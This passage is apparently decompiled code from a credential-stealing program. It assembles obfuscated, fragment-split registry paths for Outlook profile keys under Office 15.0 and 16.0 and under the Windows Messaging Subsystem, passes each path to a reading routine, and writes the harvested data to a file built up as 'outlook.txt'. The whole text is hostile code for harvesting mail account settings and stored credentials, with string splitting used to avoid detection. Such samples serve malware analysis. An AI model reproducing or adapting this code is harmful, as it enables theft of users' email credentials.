  LOBYTE(v258) = 0x98;
  v203 = vdr_assign_str(&str_look_9375CFF0413111d3, "ce\\15.0\\Outl");
  LOBYTE(v258) = 0x99;
  v135 = vdr_assign_str(&str_B88A00104B2A6676_00000001, "osoft\\Offi");
  LOBYTE(v258) = 0x9A;
  v136 = vdr_std_strcpy_wrap("Software\\Micr", &v250, v135);
  LOBYTE(v258) = 0x9B;
  v137 = vdr_str_operation_2(v203, v136, &v249);
  LOBYTE(v258) = 0x9C;
  v138 = vdr_str_operation_2(v216, v137, &v251);
  LOBYTE(v258) = 0x9D;
  v139 = vdr_str_operation_2(v229, v138, &a3);
  LOBYTE(v258) = 0x9E;
  v140 = vdr_str_operation_2(v195, v139, &v248);
  LOBYTE(v258) = 0x9F;
  if ( v140->_Myres >= 0x10 )
    v140 = (std_string *)v140->u._Ptr;
  sub_405560(v140);
  if ( v248._Myres >= 0x10 )
    operator delete(v248.u._Ptr);
  v248._Myres = 0xF;
  v248._Mysize = 0;
  v248.u._Buf[0] = 0;
  if ( a3._Myres >= 0x10 )
    operator delete(a3.u._Ptr);
  a3._Myres = 0xF;
  a3._Mysize = 0;
  a3.u._Buf[0] = 0;
  if ( v251._Myres >= 0x10 )
    operator delete(v251.u._Ptr);
  v251._Myres = 0xF;
  v251._Mysize = 0;
  v251.u._Buf[0] = 0;
  if ( v249._Myres >= 0x10 )
    operator delete(v249.u._Ptr);
  v249._Myres = 0xF;
  v249._Mysize = 0;
  v249.u._Buf[0] = 0;
  if ( v250._Myres >= 0x10 )
    operator delete(v250.u._Ptr);
  v250._Myres = 0xF;
  v250._Mysize = 0;
  v250.u._Buf[0] = 0;
  if ( str_B88A00104B2A6676_00000001._Myres >= 0x10 )
    operator delete(str_B88A00104B2A6676_00000001.u._Ptr);
  str_B88A00104B2A6676_00000001._Myres = 0xF;
  str_B88A00104B2A6676_00000001._Mysize = 0;
  str_B88A00104B2A6676_00000001.u._Buf[0] = 0;
  if ( str_look_9375CFF0413111d3._Myres >= 0x10 )
    operator delete(str_look_9375CFF0413111d3.u._Ptr);
  str_look_9375CFF0413111d3._Myres = 0xF;
  str_look_9375CFF0413111d3._Mysize = 0;
  str_look_9375CFF0413111d3.u._Buf[0] = 0;
  if ( str_Profiles_Out._Myres >= 0x10 )
    operator delete(str_Profiles_Out.u._Ptr);
  str_Profiles_Out._Myres = 0xF;
  str_Profiles_Out._Mysize = 0;
  str_Profiles_Out.u._Buf[0] = 0;
  if ( str_CurrentVersion_WindowsMess._Myres >= 0x10 )
    operator delete(str_CurrentVersion_WindowsMess.u._Ptr);
  str_CurrentVersion_WindowsMess._Myres = 0xF;
  str_CurrentVersion_WindowsMess._Mysize = 0;
  str_CurrentVersion_WindowsMess.u._Buf[0] = 0;
  v258 = 0xFFFFFFFF;
  std::string::~string(&str_Windows);
  v141 = vdr_assign_str(&v246, "B88A00104B2A6676\\00000001");
  v258 = 0xA0;
  v230 = vdr_assign_str(&str_CurrentVersion_WindowsMess, "look\\9375CFF0413111d3");
  LOBYTE(v258) = 0xA1;
  v217 = vdr_assign_str(&str_Profiles_Out, "ook\\Profiles\\Out");
  LOBYTE(v258) = 0xA2;
  v204 = vdr_assign_str(&str_look_9375CFF0413111d3, "ce\\16.0\\Outl");
  LOBYTE(v258) = 0xA3;
  v142 = vdr_assign_str(&str_B88A00104B2A6676_00000001, "osoft\\Offi");
  LOBYTE(v258) = 0xA4;
  v143 = vdr_std_strcpy_wrap("Software\\Micr", &v250, v142);
  LOBYTE(v258) = 0xA5;
  v144 = vdr_str_operation_2(v204, v143, &v249);
  LOBYTE(v258) = 0xA6;
  v145 = vdr_str_operation_2(v217, v144, &v251);
  LOBYTE(v258) = 0xA7;
  v146 = vdr_str_operation_2(v230, v145, &a3);
  LOBYTE(v258) = 0xA8;
  v147 = vdr_str_operation_2(v141, v146, &v248);
  LOBYTE(v258) = 0xA9;
  if ( v147->_Myres >= 0x10 )
    v147 = (std_string *)v147->u._Ptr;
  sub_405560(v147);
  std::string::~string(&v248);
  std::string::~string(&a3);
  std::string::~string(&v251);
  std::string::~string(&v249);
  std::string::~string(&v250);
  std::string::~string(&str_B88A00104B2A6676_00000001);
  std::string::~string(&str_look_9375CFF0413111d3);
  std::string::~string(&str_Profiles_Out);
  std::string::~string(&str_CurrentVersion_WindowsMess);
  v258 = 0xFFFFFFFF;
  std::string::~string(&v246);
  v196 = vdr_assign_str(&str_Windows, "B88A00104B2A6676\\00000002");
  v258 = 0xAA;
  v231 = vdr_assign_str(&str_Profiles_Out, "look\\9375CFF0413111d3");
  LOBYTE(v258) = 0xAB;
  v218 = vdr_assign_str(&str_look_9375CFF0413111d3, "ook\\Profiles\\Out");
  LOBYTE(v258) = 0xAC;
  v205 = vdr_assign_str(&str_B88A00104B2A6676_00000001, "ce\\16.0\\Outl");
  LOBYTE(v258) = 0xAD;
  v148 = vdr_assign_str(&v250, "osoft\\Offi");
  LOBYTE(v258) = 0xAE;
  v149 = vdr_std_strcpy_wrap("Software\\Micr", &v249, v148);
  LOBYTE(v258) = 0xAF;
  v150 = vdr_str_operation_2(v205, v149, &v251);
  LOBYTE(v258) = 0xB0;
  v151 = vdr_str_operation_2(v218, v150, &a3);
  LOBYTE(v258) = 0xB1;
  v152 = vdr_str_operation_2(v231, v151, &v248);
  LOBYTE(v258) = 0xB2;
  v153 = vdr_str_operation_2(v196, v152, &v246);
  LOBYTE(v258) = 0xB3;
  if ( v153->_Myres >= 0x10 )
    v153 = (std_string *)v153->u._Ptr;
  sub_405560(v153);
  std::string::~string(&v246);
  std::string::~string(&v248);
  std::string::~string(&a3);
  std::string::~string(&v251);
  std::string::~string(&v249);
  std::string::~string(&v250);
  std::string::~string(&str_B88A00104B2A6676_00000001);
  std::string::~string(&str_look_9375CFF0413111d3);
  std::string::~string(&str_Profiles_Out);
  v258 = 0xFFFFFFFF;
  std::string::~string(&str_Windows);
  v197 = vdr_assign_str(&str_CurrentVersion_WindowsMess, "B88A00104B2A6676\\00000003");
  v258 = 0xB4;
  v232 = vdr_assign_str(&str_Profiles_Out, "look\\9375CFF0413111d3");
  LOBYTE(v258) = 0xB5;
  v219 = vdr_assign_str(&str_look_9375CFF0413111d3, "ook\\Profiles\\Out");
  LOBYTE(v258) = 0xB6;
  v206 = vdr_assign_str(&str_B88A00104B2A6676_00000001, "ce\\16.0\\Outl");
  LOBYTE(v258) = 0xB7;
  v154 = vdr_assign_str(&v250, "osoft\\Offi");
  LOBYTE(v258) = 0xB8;
  v155 = vdr_std_strcpy_wrap("Software\\Micr", &v249, v154);
  LOBYTE(v258) = 0xB9;
  v156 = vdr_str_operation_2(v206, v155, &v251);
  LOBYTE(v258) = 0xBA;
  v157 = vdr_str_operation_2(v219, v156, &a3);
  LOBYTE(v258) = 0xBB;
  v158 = vdr_str_operation_2(v232, v157, &v248);
  LOBYTE(v258) = 0xBC;
  v159 = vdr_str_operation_2(v197, v158, &v246);
  LOBYTE(v258) = 0xBD;
  if ( v159->_Myres >= 0x10 )
    v159 = (std_string *)v159->u._Ptr;
  sub_405560(v159);
  std::string::~string(&v246);
  std::string::~string(&v248);
  std::string::~string(&a3);
  std::string::~string(&v251);
  std::string::~string(&v249);
  std::string::~string(&v250);
  std::string::~string(&str_B88A00104B2A6676_00000001);
  std::string::~string(&str_look_9375CFF0413111d3);
  std::string::~string(&str_Profiles_Out);
  v258 = 0xFFFFFFFF;
  std::string::~string(&str_CurrentVersion_WindowsMess);
  v198 = vdr_assign_str(&str_Windows, "B88A00104B2A6676\\00000004");
  v258 = 0xBE;
  v233 = vdr_assign_str(&str_Profiles_Out, "look\\9375CFF0413111d3");
  LOBYTE(v258) = 0xBF;
  v220 = vdr_assign_str(&str_look_9375CFF0413111d3, "ook\\Profiles\\Out");
  LOBYTE(v258) = 0xC0;
  v207 = vdr_assign_str(&str_B88A00104B2A6676_00000001, "ce\\16.0\\Outl");
  LOBYTE(v258) = 0xC1;
  v160 = vdr_assign_str(&v250, "osoft\\Offi");
  LOBYTE(v258) = 0xC2;
  v161 = vdr_std_strcpy_wrap("Software\\Micr", &v249, v160);
  LOBYTE(v258) = 0xC3;
  v162 = vdr_str_operation_2(v207, v161, &v251);
  LOBYTE(v258) = 0xC4;
  v163 = vdr_str_operation_2(v220, v162, &a3);
  LOBYTE(v258) = 0xC5;
  v164 = vdr_str_operation_2(v233, v163, &v248);
  LOBYTE(v258) = 0xC6;
  v165 = vdr_str_operation_2(v198, v164, &v246);
  LOBYTE(v258) = 0xC7;
  if ( v165->_Myres >= 0x10 )
    v165 = (std_string *)v165->u._Ptr;
  sub_405560(v165);
  std::string::~string(&v246);
  std::string::~string(&v248);
  std::string::~string(&a3);
  std::string::~string(&v251);
  std::string::~string(&v249);
  std::string::~string(&v250);
  std::string::~string(&str_B88A00104B2A6676_00000001);
  std::string::~string(&str_look_9375CFF0413111d3);
  std::string::~string(&str_Profiles_Out);
  v258 = 0xFFFFFFFF;
  std::string::~string(&str_Windows);
  v234 = vdr_assign_str(&str_CurrentVersion_WindowsMess, "B88A00104B2A6676\\00000001");
  v258 = 0xC8;
  v221 = vdr_assign_str(&str_B88A00104B2A6676_00000001, "les\\9375CFF0413111d3");
  LOBYTE(v258) = 0xC9;
  v208 = vdr_assign_str(&v250, "saging Subsystem\\Profi");
  LOBYTE(v258) = 0xCA;
  v166 = vdr_assign_str(&v249, "osoft\\Windows Mes");
  LOBYTE(v258) = 0xCB;
  v167 = vdr_std_strcpy_wrap("Software\\Micr", &v251, v166);
  LOBYTE(v258) = 0xCC;
  v168 = vdr_str_operation_2(v208, v167, &a3);
  LOBYTE(v258) = 0xCD;
  v169 = vdr_str_operation_2(v221, v168, &v248);
  LOBYTE(v258) = 0xCE;
  v170 = vdr_str_operation_2(v234, v169, &v246);
  LOBYTE(v258) = 0xCF;
  if ( v170->_Myres >= 0x10 )
    v170 = (std_string *)v170->u._Ptr;
  sub_405560(v170);
  std::string::~string(&v246);
  std::string::~string(&v248);
  std::string::~string(&a3);
  std::string::~string(&v251);
  std::string::~string(&v249);
  std::string::~string(&v250);
  std::string::~string(&str_B88A00104B2A6676_00000001);
  v258 = 0xFFFFFFFF;
  std::string::~string(&str_CurrentVersion_WindowsMess);
  v235 = vdr_assign_str(&str_look_9375CFF0413111d3, "B88A00104B2A6676\\00000002");
  v258 = 0xD0;
  v222 = vdr_assign_str(&str_B88A00104B2A6676_00000001, "les\\9375CFF0413111d3");
  LOBYTE(v258) = 0xD1;
  v209 = vdr_assign_str(&v250, "saging Subsystem\\Profi");
  LOBYTE(v258) = 0xD2;
  v171 = vdr_assign_str(&v249, "osoft\\Windows Mes");
  LOBYTE(v258) = 0xD3;
  v172 = vdr_std_strcpy_wrap("Software\\Micr", &v251, v171);
  LOBYTE(v258) = 0xD4;
  v173 = vdr_str_operation_2(v209, v172, &a3);
  LOBYTE(v258) = 0xD5;
  v174 = vdr_str_operation_2(v222, v173, &v248);
  LOBYTE(v258) = 0xD6;
  v175 = vdr_str_operation_2(v235, v174, &v246);
  LOBYTE(v258) = 0xD7;
  if ( v175->_Myres >= 0x10 )
    v175 = (std_string *)v175->u._Ptr;
  sub_405560(v175);
  std::string::~string(&v246);
  std::string::~string(&v248);
  std::string::~string(&a3);
  std::string::~string(&v251);
  std::string::~string(&v249);
  std::string::~string(&v250);
  std::string::~string(&str_B88A00104B2A6676_00000001);
  v258 = 0xFFFFFFFF;
  std::string::~string(&str_look_9375CFF0413111d3);
  v236 = vdr_assign_str(&str_Profiles_Out, "B88A00104B2A6676\\00000003");
  v258 = 0xD8;
  v223 = vdr_assign_str(&str_B88A00104B2A6676_00000001, "les\\9375CFF0413111d3");
  LOBYTE(v258) = 0xD9;
  v210 = vdr_assign_str(&v250, "saging Subsystem\\Profi");
  LOBYTE(v258) = 0xDA;
  v176 = vdr_assign_str(&v249, "osoft\\Windows Mes");
  LOBYTE(v258) = 0xDB;
  v177 = vdr_std_strcpy_wrap("Software\\Micr", &v251, v176);
  LOBYTE(v258) = 0xDC;
  v178 = vdr_str_operation_2(v210, v177, &a3);
  LOBYTE(v258) = 0xDD;
  v179 = vdr_str_operation_2(v223, v178, &v248);
  LOBYTE(v258) = 0xDE;
  v180 = vdr_str_operation_2(v236, v179, &v246);
  LOBYTE(v258) = 0xDF;
  if ( v180->_Myres >= 0x10 )
    v180 = (std_string *)v180->u._Ptr;
  sub_405560(v180);
  std::string::~string(&v246);
  std::string::~string(&v248);
  std::string::~string(&a3);
  std::string::~string(&v251);
  std::string::~string(&v249);
  std::string::~string(&v250);
  std::string::~string(&str_B88A00104B2A6676_00000001);
  v258 = 0xFFFFFFFF;
  std::string::~string(&str_Profiles_Out);
  v237 = vdr_assign_str(&v241, "B88A00104B2A6676\\00000004");
  v258 = 0xE0;
  v224 = vdr_assign_str(&v238, "les\\9375CFF0413111d3");
  LOBYTE(v258) = 0xE1;
  v211 = vdr_assign_str(&v240, "saging Subsystem\\Profi");
  LOBYTE(v258) = 0xE2;
  v181 = vdr_assign_str(&v242, "osoft\\Windows Mes");
  LOBYTE(v258) = 0xE3;
  v182 = vdr_std_strcpy_wrap("Software\\Micr", &v243, v181);
  LOBYTE(v258) = 0xE4;
  v183 = vdr_str_operation_2(v211, v182, &v245);
  LOBYTE(v258) = 0xE5;
  v184 = vdr_str_operation_2(v224, v183, &v244);
  LOBYTE(v258) = 0xE6;
  v185 = vdr_str_operation_2(v237, v184, &v239);
  LOBYTE(v258) = 0xE7;
  if ( v185->_Myres >= 0x10 )
    v185 = (std_string *)v185->u._Ptr;
  sub_405560(v185);
  std::string::~string(&v239);
  std::string::~string(&v244);
  std::string::~string(&v245);
  std::string::~string(&v243);
  std::string::~string(&v242);
  std::string::~string(&v240);
  std::string::~string(&v238);
  v258 = 0xFFFFFFFF;
  std::string::~string(&v241);
  memset(str_outlook_txt, 0, MAX_PATH);
  lstrcatA(str_outlook_txt, "\\");
  lstrcatA(str_outlook_txt, "out");
  lstrcatA(str_outlook_txt, "look");
  lstrcatA(str_outlook_txt, ".txt");
  v186 = lstrlenA(g_pHeapBuf);
  vdr_save_to_file(ctx_final, str_outlook_txt, g_pHeapBuf, v186);
  return memset(&g_pHeapBuf, 0, sizeof(g_pHeapBuf));
}
